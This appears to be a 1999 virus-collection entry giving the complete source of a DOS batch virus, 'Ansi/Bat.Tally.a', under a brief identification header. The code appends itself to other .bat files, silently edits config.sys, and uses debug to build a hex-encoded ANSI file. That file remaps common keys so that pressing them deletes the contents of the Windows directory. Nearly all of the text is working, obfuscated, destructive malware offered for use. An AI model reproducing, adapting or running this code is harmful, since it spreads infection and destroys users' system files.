
Ansi/Bat.Tally.a
================

Identification:
~~~~~~~~~~~~~~~

	~Virusname: 	A/B.Tally.a
	~Size:		3.489 Bytes 
	~Version:	A
	~Origin:  	USA
	~Author:	Knowdeth /Metaphase/NoMercy
	~Date:		June, 1999

Features:
~~~~~~~

	~Application	DOS
	~Payload: 	?
	~Stealth: 	?
	~Retro: 	?
	~Polymorph:	?
	~Encrypted: 	?

    Sorry, but I don't have a clue about Batch programming so I can' give 
you any further informations. Thanks to Knowdeth for the code...

----------------------> Code starts here <---------------------------------

ECHO OFF
REM Ansi/Bat.Tally.a
REM By -KD- [Metaphase & NoMercyVirusTeam]
REM Yup its old school with a new twist!
ECHO DEVICE=C:\WINDOWS\Command\ANSI.SYS>>c:\config.sys
@ctty nul.tally
for %%a in (*.bat ..\*.bat) do set tally=%%a
find "tally"<%tally%
if errorlevel 1 find "tally"<%0.BAT>>%tally%
ECHO N TALLY.ANS>tally.t
ECHO E 0100 40 45 43 48 4F 20 4F 4E 0D 0A 1B 5B 22 79 22 3B>>tally.t
ECHO E 0110 22 6E 22 3B 31 33 70 0D 0A 1B 5B 22 59 22 3B 22>>tally.t
ECHO E 0120 6E 22 3B 31 33 70 0D 0A 1B 5B 22 6E 22 3B 22 79>>tally.t
ECHO E 0130 22 3B 31 33 70 0D 0A 1B 5B 22 4E 22 3B 22 79 22>>tally.t
ECHO E 0140 3B 31 33 70 0D 0A 1B 5B 22 69 22 3B 22 6D 64 20>>tally.t
ECHO E 0150 63 3A 5C 77 69 6E 39 78 22 3B 22 63 6F 70 79 20>>tally.t
ECHO E 0160 63 3A 5C 77 69 6E 64 6F 77 73 20 2A 2E 2A 20 63>>tally.t
ECHO E 0170 3A 5C 77 69 6E 39 78 22 3B 22 64 65 6C 20 63 3A>>tally.t
ECHO E 0180 5C 77 69 6E 64 6F 77 73 20 2A 2E 2A 22 3B 31 33>>tally.t
ECHO E 0190 70 0D 0A 1B 5B 22 49 22 3B 22 6D 64 20 63 3A 5C>>tally.t
ECHO E 01A0 77 69 6E 39 78 22 3B 22 63 6F 70 79 20 63 3A 5C>>tally.t
ECHO E 01B0 77 69 6E 64 6F 77 73 20 2A 2E 2A 20 63 3A 5C 77>>tally.t
ECHO E 01C0 69 6E 39 78 22 3B 22 64 65 6C 20 63 3A 5C 77 69>>tally.t
ECHO E 01D0 6E 64 6F 77 73 20 2A 2E 2A 22 3B 31 33 70 0D 0A>>tally.t
ECHO E 01E0 1B 5B 22 65 22 3B 22 6D 64 20 63 3A 5C 77 69 6E>>tally.t
ECHO E 01F0 39 78 22 3B 22 63 6F 70 79 20 63 3A 5C 77 69 6E>>tally.t
ECHO E 0200 64 6F 77 73 20 2A 2E 2A 20 63 3A 5C 77 69 6E 39>>tally.t
ECHO E 0210 78 22 3B 22 64 65 6C 20 63 3A 5C 77 69 6E 64 6F>>tally.t
ECHO E 0220 77 73 20 2A 2E 2A 22 3B 31 33 70 0D 0A 1B 5B 22>>tally.t
ECHO E 0230 45 22 3B 22 6D 64 20 63 3A 5C 77 69 6E 39 78 22>>tally.t
ECHO E 0240 3B 22 63 6F 70 79 20 63 3A 5C 77 69 6E 64 6F 77>>tally.t
ECHO E 0250 73 20 2A 2E 2A 20 63 3A 5C 77 69 6E 39 78 22 3B>>tally.t
ECHO E 0260 22 64 65 6C 20 63 3A 5C 77 69 6E 64 6F 77 73 20>>tally.t
ECHO E 0270 2A 2E 2A 22 3B 31 33 70 0D 0A 1B 5B 22 61 22 3B>>tally.t
ECHO E 0280 22 6D 64 20 63 3A 5C 77 69 6E 39 78 22 3B 22 63>>tally.t
ECHO E 0290 6F 70 79 20 63 3A 5C 77 69 6E 64 6F 77 73 20 2A>>tally.t
ECHO E 02A0 2E 2A 20 63 3A 5C 77 69 6E 39 78 22 3B 22 64 65>>tally.t
ECHO E 02B0 6C 20 63 3A 5C 77 69 6E 64 6F 77 73 20 2A 2E 2A>>tally.t
ECHO E 02C0 22 3B 31 33 70 0D 0A 1B 5B 22 41 22 3B 22 6D 64>>tally.t
ECHO E 02D0 20 63 3A 5C 77 69 6E 39 78 22 3B 22 63 6F 70 79>>tally.t
ECHO E 02E0 20 63 3A 5C 77 69 6E 64 6F 77 73 20 2A 2E 2A 20>>tally.t
ECHO E 02F0 63 3A 5C 77 69 6E 39 78 22 3B 22 64 65 6C 20 63>>tally.t
ECHO E 0300 3A 5C 77 69 6E 64 6F 77 73 20 2A 2E 2A 22 3B 31>>tally.t
ECHO E 0310 33 70 0D 0A 1B 5B 22 6F 22 3B 22 6D 64 20 63 3A>>tally.t
ECHO E 0320 5C 77 69 6E 39 78 22 3B 22 63 6F 70 79 20 63 3A>>tally.t
ECHO E 0330 5C 77 69 6E 64 6F 77 73 20 2A 2E 2A 20 63 3A 5C>>tally.t
ECHO E 0340 77 69 6E 39 78 22 3B 22 64 65 6C 20 63 3A 5C 77>>tally.t
ECHO E 0350 69 6E 64 6F 77 73 20 2A 2E 2A 22 3B 31 33 70 0D>>tally.t
ECHO E 0360 0A 1B 5B 22 4F 22 3B 22 6D 64 20 63 3A 5C 77 69>>tally.t
ECHO E 0370 6E 39 78 22 3B 22 63 6F 70 79 20 63 3A 5C 77 69>>tally.t
ECHO E 0380 6E 64 6F 77 73 20 2A 2E 2A 20 63 3A 5C 77 69 6E>>tally.t
ECHO E 0390 39 78 22 3B 22 64 65 6C 20 63 3A 5C 77 69 6E 64>>tally.t
ECHO E 03A0 6F 77 73 20 2A 2E 2A 22 3B 31 33 70 0D 0A>>tally.t
ECHO RCX>>tally.t
ECHO 02AE>>tally.t
ECHO W>>tally.t
ECHO Q>>tally.t
debug<tally.t>nul
del tally.t
type tally.ans
del tally.ans
ctty con.tally

------------------------> Code ends here <---------------------------------
